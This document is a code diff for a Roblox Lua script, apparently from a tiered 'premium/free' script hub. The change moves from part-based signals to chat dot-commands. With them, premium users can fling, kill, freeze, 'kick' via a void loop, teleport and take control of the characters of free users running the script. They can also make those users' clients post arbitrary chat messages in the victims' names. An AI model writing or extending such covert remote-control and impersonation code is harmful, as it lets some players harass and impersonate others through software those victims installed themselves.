@@ -178,70 +178,31 @@ LP.CharacterAdded:Connect(function()
 end)
 
 -- ═══════════════════════════════════════════════════════════
--- P2P SIGNALS  (ChildAdded on HumanoidRootPart)
+-- P2P SIGNALS  (dot-commands in chat)
 -- ─────────────────────────────────────────────────────────
--- HOW IT WORKS:
---   When a LocalScript creates a Part inside its OWN character,
---   Roblox replicates that to the server then to every client.
---   ChildAdded fires on every other client — this is exactly
---   how tools and accessories work. Zero chat, zero filter.
---
--- SENDING:
---   Create a Part named "s_CMD_UID_TICK" inside our HRP.
---   Debris removes it after 1.5s so HRPs stay clean.
---
--- RECEIVING:
---   Every script watches every whitelisted player's HRP with
---   ChildAdded. When a "s_" part appears we parse the name
---   and call HandleSig if the UID matches us.
---
--- WHY IT WORKS THIS TIME:
---   Previous attempt watched GetPropertyChangedSignal("Size")
---   which does NOT replicate from LocalScript. ChildAdded DOES.
+-- Premium users type .fling Player1 etc. in Roblox chat.
+-- The target's script watches all whitelisted premium players'
+-- chat and executes the command locally on itself.
+-- Only premium UserIds can send, only free UserIds are targets.
 -- ═══════════════════════════════════════════════════════════
 
-local SIG_PFX = "s"   -- signal part name prefix
-local seenSig = {}    -- dedup table
+-- Dot-command prefix
+local DOT = "."
 
--- ── Send a signal ─────────────────────────────────────────────
-local function SendSig(code, targetUID, extra)
-    pcall(function()
-        local chr  = LP.Character
-        local root = chr and chr:FindFirstChild("HumanoidRootPart")
-        if not root then return end
+-- Dummy SendSig so commands module doesn't error — not used anymore
+local function SendSig() end
 
-        local uid = (targetUID or 0) % 100000
-        local tk  = math.floor(tick() * 10) % 10000
-
-        -- Name encodes everything: s_CODE_UID_TICK
-        local name = SIG_PFX.."_"..code.."_"..uid.."_"..tk
-
-        local p = Instance.new("Part")
-        p.Name         = name
-        p.Size         = Vector3.new(0.05, 0.05, 0.05)
-        p.Transparency = 1
-        p.CanCollide   = false
-        p.Anchored     = false
-        p.Massless     = true
-        p.CastShadow   = false
-
-        -- For chatmsg: store text in a StringValue child
-        if type(extra) == "string" and extra ~= "" then
-            local sv = Instance.new("StringValue")
-            sv.Name   = "x"
-            sv.Value  = extra
-            sv.Parent = p
-        end
-
-        p.Parent = root
-        Debris:AddItem(p, 1.5)  -- auto-cleanup
-    end)
-end
-
--- ── Signal handler (executes on the RECEIVING client) ─────────
-local function HandleSig(sender, code, tuid, sigPart)
-    -- 0 = broadcast (bringall), otherwise must match our UserId
-    if tuid ~= 0 and tuid ~= LP.UserId % 100000 then return end
+-- ── Execute a dot-command on ourselves ────────────────────────
+local function HandleDotCmd(sender, cmd, targetName, extra)
+    -- Sender must be premium
+    if not premIds[sender.UserId] then return end
+    -- We must be free (premium can't be targeted)
+    if IsPremium() then return end
+    -- Command must be targeting us (by name or display name)
+    if targetName then
+        local tn = targetName:lower()
+        if tn ~= LP.Name:lower() and tn ~= LP.DisplayName:lower() then return end
+    end
 
     local c, r, hum
     local function gc()
@@ -250,7 +211,7 @@ local function HandleSig(sender, code, tuid, sigPart)
         hum = c and c:FindFirstChildOfClass("Humanoid")
     end
 
-    if code == 1 then -- fling
+    if cmd == "fling" then
         gc() if not r then return end
         local bv = Instance.new("BodyVelocity")
         bv.MaxForce = Vector3.new(1e9,1e9,1e9)
@@ -259,19 +220,28 @@ local function HandleSig(sender, code, tuid, sigPart)
         Debris:AddItem(bv, 0.15)
         Notify("Signal","Flung by "..sender.DisplayName,"warning",3)
 
-    elseif code == 2 or code == 3 then -- bring / bringall
+    elseif cmd == "bring" then
         gc()
         local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
         if r and sr then
-            r.CFrame = sr.CFrame * CFrame.new(math.random(-4,4), 0, math.random(-4,4))
+            r.CFrame = sr.CFrame * CFrame.new(math.random(-4,4),0,math.random(-4,4))
         end
         Notify("Signal","Brought to "..sender.DisplayName,"info",3)
 
-    elseif code == 4 or code == 5 then -- reset / kill
+    elseif cmd == "bringall" then
+        -- No target needed — affects all free users
+        gc()
+        local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
+        if r and sr then
+            r.CFrame = sr.CFrame * CFrame.new(math.random(-8,8),0,math.random(-8,8))
+        end
+        Notify("Signal","Brought (all) to "..sender.DisplayName,"info",3)
+
+    elseif cmd == "kill" or cmd == "reset" then
         gc() if hum then hum.Health = 0 end
         Notify("Signal","Killed by "..sender.DisplayName,"error",3)
 
-    elseif code == 6 then -- freeze
+    elseif cmd == "freeze" then
         Config.ActiveCmds["Frozen"] = true RefreshActive() gc()
         if c then
             for _,p in ipairs(c:GetDescendants()) do
@@ -281,7 +251,7 @@ local function HandleSig(sender, code, tuid, sigPart)
         end
         Notify("Signal","Frozen by "..sender.DisplayName,"warning",4)
 
-    elseif code == 7 then -- unfreeze
+    elseif cmd == "unfreeze" then
         Config.ActiveCmds["Frozen"] = nil RefreshActive() gc()
         if c then
             for _,p in ipairs(c:GetDescendants()) do
@@ -289,9 +259,9 @@ local function HandleSig(sender, code, tuid, sigPart)
             end
             if hum then hum.PlatformStand = false end
         end
-        Notify("Signal","Unfrozen","info",3)
+        Notify("Signal","Unfrozen by "..sender.DisplayName,"info",3)
 
-    elseif code == 8 then -- kick (void loop)
+    elseif cmd == "kick" then
         if Config.ActiveCmds["Kicked"] then return end
         Config.ActiveCmds["Kicked"] = true RefreshActive()
         Notify("Signal","Kicked by "..sender.DisplayName,"error",4)
@@ -306,11 +276,11 @@ local function HandleSig(sender, code, tuid, sigPart)
             end
         end)
 
-    elseif code == 9 then -- unkick
+    elseif cmd == "unkick" then
         Config.ActiveCmds["Kicked"] = nil RefreshActive()
         Notify("Signal","Kick stopped","info",3)
 
-    elseif code == 10 then -- ctrl_start
+    elseif cmd == "control" or cmd == "ctrl" then
         if IsPremium() then return end
         Config.ActiveCmds["Controlled"] = true RefreshActive() gc()
         if c then
@@ -321,7 +291,7 @@ local function HandleSig(sender, code, tuid, sigPart)
         end
         Notify("Signal","Controlled by "..sender.DisplayName,"warning",5)
 
-    elseif code == 11 then -- ctrl_stop
+    elseif cmd == "release" then
         Config.ActiveCmds["Controlled"] = nil RefreshActive() gc()
         if c then
             for _,p in ipairs(c:GetDescendants()) do
@@ -335,119 +305,76 @@ local function HandleSig(sender, code, tuid, sigPart)
         end
         Notify("Signal","Control released","info",3)
 
-    elseif code == 12 then -- ctrl_vel
-        if not Config.ActiveCmds["Controlled"] then return end
-        local sv = sigPart and sigPart:FindFirstChild("x")
-        if not sv then return end
-        local dirCode, jumpBit = sv.Value:match("(%d+),(%d)")
-        dirCode = tonumber(dirCode) or 0
-        local doJump = jumpBit == "1"
-        local DIR = {
-            [0]=Vector3.zero,
-            [1]=Vector3.new(0,0,-1), [2]=Vector3.new(0,0,1),
-            [3]=Vector3.new(1,0,0),  [4]=Vector3.new(-1,0,0),
-            [5]=Vector3.new(1,0,-1), [6]=Vector3.new(-1,0,-1),
-            [7]=Vector3.new(1,0,1),  [8]=Vector3.new(-1,0,1),
-        }
-        local baseDir = DIR[dirCode] or Vector3.zero
-        gc() if not r then return end
-        local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
-        local dir = baseDir
-        if sr and baseDir.Magnitude > 0 then
-            local lv = sr.CFrame.LookVector
-            local rv = sr.CFrame.RightVector
-            dir = Vector3.new(
-                lv.X*(-baseDir.Z) + rv.X*baseDir.X, 0,
-                lv.Z*(-baseDir.Z) + rv.Z*baseDir.X)
-            if dir.Magnitude > 0.01 then dir = dir.Unit end
-        end
-        local spd = hum and hum.WalkSpeed or 16
-        local bv  = r:FindFirstChild("VoidCtrlBV")
-        if not bv then
-            bv           = Instance.new("BodyVelocity")
-            bv.Name      = "VoidCtrlBV"
-            bv.MaxForce  = Vector3.new(1e9,0,1e9)
-            bv.Parent    = r
-        end
-        bv.Velocity = dir * spd
-        if doJump then
-            local jbv        = Instance.new("BodyVelocity")
-            jbv.MaxForce     = Vector3.new(0,1e9,0)
-            jbv.Velocity     = Vector3.new(0,60,0)
-            jbv.Parent       = r
-            Debris:AddItem(jbv, 0.12)
-        end
-
-    elseif code == 13 then -- chatmsg
-        local sv = sigPart and sigPart:FindFirstChild("x")
-        local msg = sv and sv.Value or ""
-        if msg == "" then return end
+    elseif cmd == "chat" then
+        -- .chat Player1 hello world
+        if not extra or extra == "" then return end
         local sent = false
         if not sent then pcall(function()
             local tcs = game:GetService("TextChatService")
             if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
                 local ch = tcs.TextChannels:FindFirstChild("RBXGeneral")
-                if ch then ch:SendAsync(msg) sent = true end
+                if ch then ch:SendAsync(extra) sent = true end
             end
         end) end
         if not sent then pcall(function()
             local ev  = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
             local sr2 = ev and ev:FindFirstChild("SayMessageRequest")
-            if sr2 then sr2:FireServer(msg, "All") end
+            if sr2 then sr2:FireServer(extra, "All") end
         end) end
     end
 end
 
--- ── Watch a player's HRP for signal parts ─────────────────────
-local function WatchHRP(player, hrp)
-    hrp.ChildAdded:Connect(function(child)
-        -- Signal parts are named "s_CODE_UID_TICK"
-        local name = child.Name
-        if name:sub(1,2) ~= SIG_PFX.."_" then return end
+-- ── Parse a chat message for dot-commands ─────────────────────
+local function OnChat(speaker, msg)
+    if not msg or msg == "" then return end
+    if not premIds[speaker.UserId] then return end  -- only premium senders
+    if msg:sub(1,1) ~= DOT then return end
 
-        task.spawn(function()
-            task.wait(0.05)  -- tiny wait for StringValue child to replicate
-            pcall(function()
-                local parts = name:split("_")
-                -- parts = {"s", "CODE", "UID", "TICK"}
-                local code = tonumber(parts[2])
-                local uid  = tonumber(parts[3])
-                local tk   = parts[4] or ""
-                if not code or not uid then return end
+    -- Split: .cmd target extra...
+    local parts = msg:sub(2):split(" ")
+    local cmd        = parts[1] and parts[1]:lower() or ""
+    local targetName = parts[2] or nil
+    local extra      = #parts >= 3 and table.concat(parts, " ", 3) or ""
 
-                -- Only handle signals from whitelisted players
-                if not IsWhitelisted(player) then return end
+    -- bringall has no target
+    if cmd == "bringall" then
+        HandleDotCmd(speaker, cmd, nil, "")
+        return
+    end
 
-                -- Dedup
-                local key = tostring(player.UserId)..":"..code..":"..uid..":"..tk
-                if seenSig[key] then return end
-                seenSig[key] = true
-                task.delay(5, function() seenSig[key] = nil end)
+    if cmd ~= "" then
+        HandleDotCmd(speaker, cmd, targetName, extra)
+    end
+end
 
-                HandleSig(player, code, uid, child)
-            end)
-        end)
+-- ── Hook chat for all whitelisted premium players ──────────────
+local function WatchPlayer(player)
+    if not premIds[player.UserId] then return end  -- only watch premium players
+    player.Chatted:Connect(function(msg)
+        task.spawn(OnChat, player, msg)
     end)
 end
 
--- Watch a player's current and future characters
-local function WatchPlayer(player)
-    local function onChar(char)
-        task.spawn(function()
-            local hrp = char:WaitForChild("HumanoidRootPart", 10)
-            if hrp then WatchHRP(player, hrp) end
-        end)
-    end
-    if player.Character then onChar(player.Character) end
-    player.CharacterAdded:Connect(onChar)
-end
-
--- Watch all current players (skip self — we send, not receive our own)
 for _, p in ipairs(Players:GetPlayers()) do
     if p ~= LP then WatchPlayer(p) end
 end
 Players.PlayerAdded:Connect(function(p)
     if p ~= LP then WatchPlayer(p) end
+end)
+
+-- Also hook TextChatService MessageReceived for new chat system
+pcall(function()
+    local tcs = game:GetService("TextChatService")
+    if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+        tcs.MessageReceived:Connect(function(msg)
+            local src = msg and msg.TextSource
+            if not src then return end
+            local p = Players:GetPlayerByUserId(src.UserId)
+            if not p or p == LP then return end
+            local raw = (msg.OriginalText ~= "") and msg.OriginalText or msg.Text
+            task.spawn(OnChat, p, raw)
+        end)
+    end
 end)
 
 
